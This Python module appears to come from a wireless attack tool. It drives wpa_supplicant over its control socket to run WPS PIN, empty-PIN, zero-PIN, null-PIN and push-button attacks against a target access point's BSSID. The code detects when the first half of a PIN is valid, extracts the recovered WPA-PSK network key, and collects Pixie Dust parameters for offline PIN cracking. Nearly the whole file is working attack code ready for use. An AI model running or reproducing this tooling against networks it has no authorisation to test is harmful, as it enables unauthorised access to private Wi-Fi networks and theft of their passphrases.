"""Live WPS attack execution via wpa_supplicant control interface.

Provides validated PIN/null-PIN/empty-PIN/zero-PIN/PBC attack methods with
proper timeout handling, first-half detection, and credential extraction.
All wpa_supplicant interaction uses Unix domain sockets with bounded operations.
"""

from __future__ import annotations

import os
import re
import socket
import tempfile
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path

from .models import AttackMethod, AttackOutcome, AttackResult, normalize_bssid
from .runner import CommandRunner

_WPA_SUPPLICANT_CTRL_TIMEOUT = 10.0  # Socket response timeout
_M_MESSAGE_RE = re.compile(r"WPS-M([0-9]+)D", re.IGNORECASE)
_PSK_RE = re.compile(r"WPA-PSK-KEY:\s*([0-9a-fA-F]{64}|.+)", re.IGNORECASE)
_SSID_RE = re.compile(
    r"(?:WPS-CRED-RECEIVED|CTRL-EVENT-CONNECTED).*?ssid='?([^'\s]+)", re.IGNORECASE
)


class WPSAttackError(RuntimeError):
    """Raised when wpa_supplicant interaction fails."""

    pass


@dataclass(slots=True)
class PixieData:
    """Pixie Dust parameters extracted from wpa_supplicant debug output."""

    pke: str = ""
    pkr: str = ""
    e_hash1: str = ""
    e_hash2: str = ""
    authkey: str = ""
    e_nonce: str = ""

    def is_complete(self) -> bool:
        """True if all required parameters collected."""
        return all([self.pke, self.pkr, self.e_hash1, self.e_hash2, self.authkey, self.e_nonce])

    def clear(self) -> None:
        """Reset all fields."""
        self.pke = ""
        self.pkr = ""
        self.e_hash1 = ""
        self.e_hash2 = ""
        self.authkey = ""
        self.e_nonce = ""


@dataclass(slots=True)
class AttackProgress:
    """Mutable state during a single WPS attempt."""

    last_m_message: int = 0
    essid: str = ""
    wpa_psk: str = ""
    status: str = ""  # GOT_PSK, WSC_NACK, WPS_FAIL, etc.
    attempts: int = 0
    pixie_data: PixieData = field(default_factory=PixieData)

    def first_half_valid(self) -> bool:
        """True if we got past M4 (indicates first 4 digits correct)."""
        return self.last_m_message > 4

    def clear(self) -> None:
        """Reset for new attempt."""
        self.last_m_message = 0
        self.essid = ""
        self.wpa_psk = ""
        self.status = ""
        self.pixie_data.clear()


class WPASupplicantController:
    """Unix domain socket controller for wpa_supplicant."""

    def __init__(
        self,
        interface: str,
        runner: CommandRunner,
        *,
        debug: bool = False,
    ) -> None:
        self.interface = interface
        self.runner = runner
        self.debug = debug
        self._ctrl_dir: Path | None = None
        self._ctrl_socket_path: Path | None = None
        self._socket: socket.socket | None = None
        self._process_pid: int | None = None

    def __enter__(self) -> WPASupplicantController:
        """Start wpa_supplicant and connect control socket."""
        self.start()
        return self

    def __exit__(self, *args) -> None:
        """Stop wpa_supplicant and cleanup."""
        self.stop()

    def start(self) -> None:
        """Launch wpa_supplicant with control interface.
        
        Exception-safe: If startup fails at any point, cleanup is automatically
        performed before re-raising the exception.
        """
        if self._socket is not None:
            return  # Already started

        try:
            # Create temporary control directory
            self._ctrl_dir = Path(tempfile.mkdtemp(prefix="wifit_wpas_"))

            # Create minimal wpa_supplicant config
            config_path = self._ctrl_dir / "wpa_supplicant.conf"
            config_path.write_text(
                "ctrl_interface=" + str(self._ctrl_dir) + "\n"
                "ap_scan=1\n"
                "device_name=WiFiT\n"
                "device_type=6-0050F204-1\n"
                "config_methods=label virtual_display virtual_push_button keypad\n"
                "wps_cred_processing=2\n",
                encoding="utf-8",
            )

            # Launch wpa_supplicant
            cmd = [
                "wpa_supplicant",
                "-i",
                self.interface,
                "-c",
                str(config_path),
                "-B",  # Background
                "-P",
                str(self._ctrl_dir / "wpas.pid"),
            ]

            if self.debug:
                cmd.extend(["-dd", "-f", str(self._ctrl_dir / "wpas.log")])

            result = self.runner.run(cmd, timeout=5.0)
            if not result.ok:
                raise WPSAttackError(f"Failed to start wpa_supplicant: {result.stderr}")

            # Wait for control socket
            self._ctrl_socket_path = self._ctrl_dir / self.interface
            for _ in range(20):  # Wait up to 2 seconds
                if self._ctrl_socket_path.exists():
                    break
                time.sleep(0.1)
            else:
                raise WPSAttackError(
                    f"wpa_supplicant control socket not found: {self._ctrl_socket_path}"
                )

            # Connect control socket (Unix domain socket)
            self._socket = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)  # type: ignore[attr-defined]
            self._socket.settimeout(_WPA_SUPPLICANT_CTRL_TIMEOUT)

            # Bind to temporary client socket
            client_socket = self._ctrl_dir / f"wifit_{os.getpid()}.sock"
            try:
                self._socket.bind(str(client_socket))
            except OSError as e:
                raise WPSAttackError(f"Failed to bind client socket: {e}")

            try:
                self._socket.connect(str(self._ctrl_socket_path))
            except OSError as e:
                raise WPSAttackError(f"Failed to connect to wpa_supplicant: {e}")

            # Verify connection
            response = self._send_command("PING")
            if response != "PONG":
                raise WPSAttackError(f"wpa_supplicant PING failed: {response}")

            # Attach to receive unsolicited events
            response = self._send_command("ATTACH")
            if "OK" not in response:
                raise WPSAttackError(f"wpa_supplicant ATTACH failed: {response}")
                
        except Exception:
            # Cleanup partial state before re-raising
            self.stop()
            raise

    def stop(self) -> None:
        """Terminate wpa_supplicant and cleanup."""
        if self._socket is not None:
            try:
                self._send_command("TERMINATE", expect_response=False)
            except Exception:
                pass
            try:
                self._socket.close()
            except Exception:
                pass
            self._socket = None

        # Kill process if still running
        if self._ctrl_dir:
            pid_file = self._ctrl_dir / "wpas.pid"
            if pid_file.exists():
                try:
                    pid = int(pid_file.read_text())
                    self.runner.run(["kill", str(pid)], timeout=2.0)
                except Exception:
                    pass

        # Cleanup temp directory
        if self._ctrl_dir and self._ctrl_dir.exists():
            import shutil

            try:
                shutil.rmtree(self._ctrl_dir)
            except Exception:
                pass
            self._ctrl_dir = None

    def _send_command(self, cmd: str, *, expect_response: bool = True) -> str:
        """Send command to wpa_supplicant and return response."""
        if self._socket is None:
            raise WPSAttackError("Not connected to wpa_supplicant")

        try:
            self._socket.send(cmd.encode("utf-8"))
            if not expect_response:
                return ""
            response = self._socket.recv(4096).decode("utf-8", errors="replace")
            return response.strip()
        except TimeoutError:
            raise WPSAttackError(f"wpa_supplicant command timeout: {cmd}")
        except OSError as e:
            raise WPSAttackError(f"wpa_supplicant socket error: {e}")

    def try_pin(
        self,
        bssid: str,
        pin: str,
        *,
        timeout: float = 30.0,
        collect_pixie: bool = False,
    ) -> AttackResult:
        """Attempt WPS PIN attack.

        Args:
            bssid: Target AP MAC address
            pin: 8-digit PIN or empty string for empty PIN
            timeout: Maximum attack duration in seconds
            collect_pixie: If True, extract Pixie Dust parameters

        Returns:
            AttackResult with outcome and credentials if successful
        """
        bssid_normalized = normalize_bssid(bssid)
        progress = AttackProgress()
        wall_started_at = datetime.now(timezone.utc)
        deadline = time.monotonic() + timeout

        # Determine attack method
        if pin == "":
            method = AttackMethod.EMPTY_PIN
            cmd = f"WPS_REG {bssid_normalized}"  # No PIN parameter
        elif pin == "00000000":
            method = AttackMethod.ZERO_PIN
            cmd = f"WPS_REG {bssid_normalized} {pin}"
        else:
            method = AttackMethod.PIN
            cmd = f"WPS_REG {bssid_normalized} {pin}"

        # Send WPS command
        response = self._send_command(cmd)
        if "OK" not in response:
            return AttackResult(
                bssid=bssid_normalized,
                ssid="",
                method=method,
                outcome=AttackOutcome.ERROR,
                attempts=1,
                started_at=wall_started_at,
                finished_at=datetime.now(timezone.utc),
                message=f"WPS_REG command rejected: {response}",
            )

        progress.attempts = 1

        # Monitor wpa_supplicant events
        while time.monotonic() < deadline:
            try:
                events = self._receive_events(timeout=1.0)
                for event in events:
                    self._process_event(event, progress, collect_pixie)

                    # Check terminal conditions
                    if progress.status == "GOT_PSK":
                        self._send_command("WPS_CANCEL", expect_response=False)
                        return AttackResult(
                            bssid=bssid_normalized,
                            ssid=progress.essid,
                            method=method,
                            outcome=AttackOutcome.SUCCESS,
                            attempts=progress.attempts,
                            started_at=wall_started_at,
                            finished_at=datetime.now(timezone.utc),
                            wps_pin=pin if pin else "(empty)",
                            network_key=progress.wpa_psk,
                        )

                    elif progress.status == "WSC_NACK":
                        self._send_command("WPS_CANCEL", expect_response=False)
                        # Check if first half was valid
                        if progress.first_half_valid():
                            return AttackResult(
                                bssid=bssid_normalized,
                                ssid=progress.essid,
                                method=method,
                                outcome=AttackOutcome.FAILURE,
                                attempts=progress.attempts,
                                started_at=wall_started_at,
                                finished_at=datetime.now(timezone.utc),
                                message="PIN rejected (first half valid)",
                                metadata={"first_half_valid": True},
                            )
                        else:
                            return AttackResult(
                                bssid=bssid_normalized,
                                ssid=progress.essid,
                                method=method,
                                outcome=AttackOutcome.FAILURE,
                                attempts=progress.attempts,
                                started_at=wall_started_at,
                                finished_at=datetime.now(timezone.utc),
                                message="PIN rejected",
                            )

                    elif progress.status == "WPS_FAIL":
                        self._send_command("WPS_CANCEL", expect_response=False)
                        return AttackResult(
                            bssid=bssid_normalized,
                            ssid=progress.essid,
                            method=method,
                            outcome=AttackOutcome.ERROR,
                            attempts=progress.attempts,
                            started_at=wall_started_at,
                            finished_at=datetime.now(timezone.utc),
                            message="WPS transaction failed",
                        )

            except TimeoutError:
                continue

        # Timeout reached
        self._send_command("WPS_CANCEL", expect_response=False)
        return AttackResult(
            bssid=bssid_normalized,
            ssid=progress.essid,
            method=method,
            outcome=AttackOutcome.TIMEOUT,
            attempts=progress.attempts,
            started_at=wall_started_at,
            finished_at=datetime.now(timezone.utc),
            message=f"Attack exceeded {timeout}s timeout",
        )

    def try_null_pin(
        self,
        bssid: str,
        *,
        timeout: float = 30.0,
    ) -> AttackResult:
        """Attempt null PIN (WPS_REG without PIN parameter).

        Some APs accept association without a PIN (pixie-vulnerable).
        This sends WPS_REG command WITHOUT any PIN parameter.
        """
        bssid_normalized = normalize_bssid(bssid)
        progress = AttackProgress()
        wall_started_at = datetime.now(timezone.utc)
        deadline = time.monotonic() + timeout

        # Send WPS_REG without PIN parameter (true null PIN)
        cmd = f"WPS_REG {bssid_normalized}"

        response = self._send_command(cmd)
        if "OK" not in response:
            return AttackResult(
                bssid=bssid_normalized,
                ssid="",
                method=AttackMethod.NULL_PIN,
                outcome=AttackOutcome.ERROR,
                attempts=1,
                started_at=wall_started_at,
                finished_at=datetime.now(timezone.utc),
                message=f"WPS_REG command rejected: {response}",
            )

        progress.attempts = 1

        # Monitor wpa_supplicant events
        while time.monotonic() < deadline:
            try:
                events = self._receive_events(timeout=1.0)
                for event in events:
                    self._process_event(event, progress, collect_pixie=False)

                    if progress.status == "GOT_PSK":
                        self._send_command("WPS_CANCEL", expect_response=False)
                        return AttackResult(
                            bssid=bssid_normalized,
                            ssid=progress.essid,
                            method=AttackMethod.NULL_PIN,
                            outcome=AttackOutcome.SUCCESS,
                            attempts=progress.attempts,
                            started_at=wall_started_at,
                            finished_at=datetime.now(timezone.utc),
                            wps_pin="(null)",
                            network_key=progress.wpa_psk,
                        )

                    elif progress.status in ("WSC_NACK", "WPS_FAIL"):
                        self._send_command("WPS_CANCEL", expect_response=False)
                        return AttackResult(
                            bssid=bssid_normalized,
                            ssid=progress.essid,
                            method=AttackMethod.NULL_PIN,
                            outcome=AttackOutcome.FAILURE,
                            attempts=progress.attempts,
                            started_at=wall_started_at,
                            finished_at=datetime.now(timezone.utc),
                            message="Null PIN rejected",
                        )

            except TimeoutError:
                continue

        # Timeout reached
        self._send_command("WPS_CANCEL", expect_response=False)
        return AttackResult(
            bssid=bssid_normalized,
            ssid=progress.essid,
            method=AttackMethod.NULL_PIN,
            outcome=AttackOutcome.TIMEOUT,
            attempts=progress.attempts,
            started_at=wall_started_at,
            finished_at=datetime.now(timezone.utc),
            message=f"Attack exceeded {timeout}s timeout",
        )

    def try_pbc(
        self,
        bssid: str | None = None,
        *,
        timeout: float = 120.0,
    ) -> AttackResult:
        """Attempt WPS Push Button Configuration.

        Args:
            bssid: Target AP MAC (None for broadcast PBC)
            timeout: Maximum wait time for button press

        Returns:
            AttackResult with outcome
        """
        progress = AttackProgress()
        wall_started_at = datetime.now(timezone.utc)
        deadline = time.monotonic() + timeout

        # Send PBC command
        if bssid:
            bssid_normalized = normalize_bssid(bssid)
            cmd = f"WPS_PBC {bssid_normalized}"
            result_bssid = bssid_normalized
        else:
            # Broadcast mode - use None for result BSSID
            cmd = "WPS_PBC"
            result_bssid = None

        response = self._send_command(cmd)
        if "OK" not in response:
            return AttackResult(
                bssid=result_bssid,
                ssid="",
                method=AttackMethod.PBC,
                outcome=AttackOutcome.ERROR,
                attempts=1,
                started_at=wall_started_at,
                finished_at=datetime.now(timezone.utc),
                message=f"WPS_PBC command rejected: {response}",
            )

        progress.attempts = 1

        # Monitor for PBC success
        while time.monotonic() < deadline:
            try:
                events = self._receive_events(timeout=2.0)
                for event in events:
                    self._process_event(event, progress, collect_pixie=False)

                    if progress.status == "GOT_PSK":
                        self._send_command("WPS_CANCEL", expect_response=False)
                        return AttackResult(
                            bssid=result_bssid,
                            ssid=progress.essid,
                            method=AttackMethod.PBC,
                            outcome=AttackOutcome.SUCCESS,
                            attempts=progress.attempts,
                            started_at=wall_started_at,
                            finished_at=datetime.now(timezone.utc),
                            network_key=progress.wpa_psk,
                        )

                    elif progress.status in ("WSC_NACK", "WPS_FAIL"):
                        self._send_command("WPS_CANCEL", expect_response=False)
                        return AttackResult(
                            bssid=result_bssid,
                            ssid=progress.essid,
                            method=AttackMethod.PBC,
                            outcome=AttackOutcome.FAILURE,
                            attempts=progress.attempts,
                            started_at=wall_started_at,
                            finished_at=datetime.now(timezone.utc),
                            message="PBC failed or rejected",
                        )

            except TimeoutError:
                continue

        # Timeout (user didn't press button)
        self._send_command("WPS_CANCEL", expect_response=False)
        return AttackResult(
            bssid=result_bssid,
            ssid="",
            method=AttackMethod.PBC,
            outcome=AttackOutcome.TIMEOUT,
            attempts=progress.attempts,
            started_at=wall_started_at,
            finished_at=datetime.now(timezone.utc),
            message=f"No PBC press detected within {timeout}s",
        )

    def _receive_events(self, timeout: float = 1.0) -> list[str]:
        """Receive pending wpa_supplicant events."""
        if self._socket is None:
            return []

        events = []
        old_timeout = self._socket.gettimeout()
        self._socket.settimeout(timeout)

        try:
            while True:
                data = self._socket.recv(4096)
                if data:
                    text = data.decode("utf-8", errors="replace")
                    # Events come as multi-line or with null separators
                    for line in text.split("\n"):
                        line = line.strip()
                        if line and not line.startswith("FAIL"):
                            events.append(line)
                else:
                    break
        except TimeoutError:
            pass
        finally:
            self._socket.settimeout(old_timeout)

        return events

    def _process_event(
        self,
        event: str,
        progress: AttackProgress,
        collect_pixie: bool,
    ) -> None:
        """Parse wpa_supplicant event and update progress."""
        # M-message tracking
        m_match = _M_MESSAGE_RE.search(event)
        if m_match:
            m_num = int(m_match.group(1))
            progress.last_m_message = max(progress.last_m_message, m_num)

        # Success indicators
        if "WPS-CRED-RECEIVED" in event or "WPS-SUCCESS" in event:
            progress.status = "GOT_PSK"

        # Failure indicators
        if "WPS-FAIL" in event or "WPS-TIMEOUT" in event:
            progress.status = "WPS_FAIL"

        if "WSC_NACK" in event:
            progress.status = "WSC_NACK"

        # SSID extraction
        ssid_match = _SSID_RE.search(event)
        if ssid_match and not progress.essid:
            progress.essid = ssid_match.group(1).strip("'\"")

        # PSK extraction
        psk_match = _PSK_RE.search(event)
        if psk_match and not progress.wpa_psk:
            progress.wpa_psk = psk_match.group(1)

        # Pixie Dust data extraction
        if collect_pixie:
            if "PKE:" in event:
                progress.pixie_data.pke = event.split("PKE:")[-1].strip()
            elif "PKR:" in event:
                progress.pixie_data.pkr = event.split("PKR:")[-1].strip()
            elif "E-Hash1:" in event:
                progress.pixie_data.e_hash1 = event.split("E-Hash1:")[-1].strip()
            elif "E-Hash2:" in event:
                progress.pixie_data.e_hash2 = event.split("E-Hash2:")[-1].strip()
            elif "AuthKey:" in event:
                progress.pixie_data.authkey = event.split("AuthKey:")[-1].strip()
            elif "E-Nonce:" in event:
                progress.pixie_data.e_nonce = event.split("E-Nonce:")[-1].strip()


def try_pin_attack(
    interface: str,
    bssid: str,
    pin: str,
    *,
    runner: CommandRunner | None = None,
    timeout: float = 30.0,
    collect_pixie: bool = False,
    debug: bool = False,
) -> AttackResult:
    """Convenience function for single PIN attempt.

    Args:
        interface: Wireless interface name
        bssid: Target AP BSSID
        pin: 8-digit WPS PIN or empty string
        runner: CommandRunner instance (creates default if None)
        timeout: Attack timeout in seconds
        collect_pixie: Extract Pixie Dust parameters
        debug: Enable wpa_supplicant debug logging

    Returns:
        AttackResult with outcome and credentials
    """
    if runner is None:
        runner = CommandRunner()

    with WPASupplicantController(interface, runner, debug=debug) as ctrl:
        return ctrl.try_pin(bssid, pin, timeout=timeout, collect_pixie=collect_pixie)


def try_pbc_attack(
    interface: str,
    bssid: str | None = None,
    *,
    runner: CommandRunner | None = None,
    timeout: float = 120.0,
    debug: bool = False,
) -> AttackResult:
    """Convenience function for PBC attempt.

    Args:
        interface: Wireless interface name
        bssid: Target AP BSSID (None for broadcast)
        runner: CommandRunner instance (creates default if None)
        timeout: Maximum wait time for button press
        debug: Enable wpa_supplicant debug logging

    Returns:
        AttackResult with outcome and credentials
    """
    if runner is None:
        runner = CommandRunner()

    with WPASupplicantController(interface, runner, debug=debug) as ctrl:
        return ctrl.try_pbc(bssid, timeout=timeout)
